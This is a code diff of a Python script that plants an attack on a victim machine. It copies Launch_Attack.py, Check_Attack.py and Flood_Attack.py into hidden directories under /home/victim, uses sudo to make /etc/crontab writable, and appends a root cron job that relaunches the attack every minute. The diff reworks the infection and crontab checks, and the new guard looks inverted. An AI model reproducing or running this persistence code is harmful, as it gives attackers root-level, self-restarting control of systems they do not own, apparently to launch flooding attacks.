@@ -4,44 +4,25 @@ import sys
 
 attackDirs = ['/home/victim/.etc', '/home/victim/.var']
 attackFiles = ['/Launch_Attack.py', '/Check_Attack.py', '/Flood_Attack.py']
+etcAttackCommand = '* * * * * root sudo /usr/bin/python /home/victim/.etc/.module/Launch_Attack.py'
+varAttackCommand = '* * * * * root sudo /usr/bin/python /home/victim/.var/.module/Launch_Attack.py'
 
 
 def set_up_crontab():
-    # Read Crontab
-    os.system('sudo chmod +r /etc/crontab')
-
-    crontab = open('/etc/crontab', 'r')
-
-    writeLines = [line for line in crontab if line != '\n' or line != '']
-
-    lastLine = writeLines[len(writeLines) - 1]
-    if not lastLine[len(lastLine) - 1] == '\n':
-        writeLines[len(writeLines) - 1] += '\n'
-
-    crontab.close()
+    if not is_set_up_crontab():
+        return
 
     # Write Crontab
     os.system('sudo chmod +w /etc/crontab')
 
-    crontab = open('/etc/crontab', 'w')
+    crontab = open('/etc/crontab', 'a')
 
-    etcAttackCommand = '* * * * * root sudo /usr/bin/python /home/victim/.etc/.module/Launch_Attack.py\n'
-    varAttackCommand = '* * * * * root sudo /usr/bin/python /home/victim/.var/.module/Launch_Attack.py'
-
-    s = ''
-    for writeLine in writeLines:
-        s += writeLine
-
-    s += (etcAttackCommand + varAttackCommand)
-
-    crontab.write(s)
+    crontab.write(etcAttackCommand)
     crontab.close()
-
-    return
 
 
 def set_up_attack():
-    if is_infect():
+    if is_set_up_attack():
         return
 
     # Make directories
@@ -53,13 +34,30 @@ def set_up_attack():
         os.system('sudo cp c.py {0}/.module/Flood_Attack.py'.format(attackDir))
 
 
-def is_infect():
+def is_set_up_attack():
     for attackDir in attackDirs:
         for attackFile in attackFiles:
             if not os.path.isfile(attackDir+attackFile):
                 return False
 
     return True
+
+
+def is_set_up_crontab():
+    # Read Crontab
+    os.system('sudo chmod +r /etc/crontab')
+
+    crontab = open('/etc/crontab', 'r')
+
+    result = False
+
+    for line in crontab:
+        if line.find(etcAttackCommand) > -1 or line.find(varAttackCommand) > -1:
+            result = True
+
+    crontab.close()
+
+    return result
 
 
 def is_root():
